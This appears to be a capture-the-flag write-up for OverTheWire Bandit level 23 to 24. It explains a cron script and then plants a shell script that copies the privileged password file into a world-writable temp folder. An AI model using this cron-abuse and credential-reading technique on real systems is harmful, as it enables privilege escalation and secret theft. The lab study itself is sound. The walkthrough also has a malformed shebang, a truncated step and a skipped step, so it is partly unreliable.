# [Bandit Level 23 → Level 24](https://overthewire.org/wargames/bandit/bandit24.html)

## Goal
A program is running automatically at regular intervals from cron, the time-based job scheduler. Look in /etc/cron.d/ for the configuration and see what command is being executed.
NOTE: This level requires you to create your own first shell-script. 
NOTE 2: Keep in mind that your shell script is removed once executed, so you may want to keep a copy around.

## Theory

## Solution
1. Similar to the last two levels, find out what the script for this level does.
```
bandit23@bandit:~$ cat /usr/bin/cronjob_bandit24.sh
#!/bin/bash

myname=$(whoami)

cd /var/spool/$myname/foo
echo "Executing and deleting all scripts in /var/spool/$myname/foo:"
for i in * .*;
do
    if [ "$i" != "." -a "$i" != ".." ];
    then
        echo "Handling $i"
        owner="$(stat --format "%U" ./$i)"
        if [ "${owner}" = "bandit23" ]; then
            timeout -s 9 60 ./$i
        fi
        rm -f ./$i
    fi
done
```
2. The script executes and deletes all scripts in `/var/spool/$myname/foo`.
3. The `for` loop loops over all files in the directory `/var/spool/$myname/foo`.
4. The `if` statement exclues the directories '.' and '..'.
5. The `owner` variable stores the user of the file.
6. The next `if` statement checks if this owner is bandit23.
7. Then the file is deleted.
8. Since we are loggedin as bandit23, we can run the script to get the password for bandit24 using the 
9. The 'NOTE' says to keep a copy of the password before it is removed. Therefore we start by creating a `temp` folder. And then create a file called `bandit24.sh` in it.
```
bandit23@bandit:~$ mktemp -d
/tmp/tmp.OIBMBUmDXt
bandit23@bandit:~$ cd /tmp/tmp.OIBMBUmDXt
bandit23@bandit:/tmp/tmp.OIBMBUmDXt$ nano bandit24.sh
```
10. Write the following two lines in the file. Press ctrl+O to save it and then exit with ctrl+X. Use `cat` to verify if the code is properly written. Remember that the name of the temp folder is randomly generated and so wiil be different for you.
```
bandit23@bandit:/tmp/tmp.OIBMBUmDXt$ cat bandit24.sh
!#/bin/bash
cat /etc/bandit_pass/bandit24 > /tmp/tmp.OIBMBUmDXt/password
```
11. The above script copies `/etc/bandit_pass/bandit24` into `/tmp/tmp.OIBMBUmDXt/password`. Dont forget to create a file called `password`.
12. Give the necessary permissions to make `bandit24.sh` executable and also the temp folder.
```
bandit23@bandit:/tmp/tmp.OIBMBUmDXt$ chmod +rx bandit24.sh
bandit23@bandit:/tmp/tmp.OIBMBUmDXt$ chmod 777 /tmp/tmp.OIBMBUmDXt
bandit23@bandit:/tmp/tmp.OIBMBUmDXt$ touch password
```
13. Now copy `bandit24.sh` to the folder `/var/spool/$myname/foo` and wait for the script to run.
14. Use `cat` on `password` to see the password for the next level.
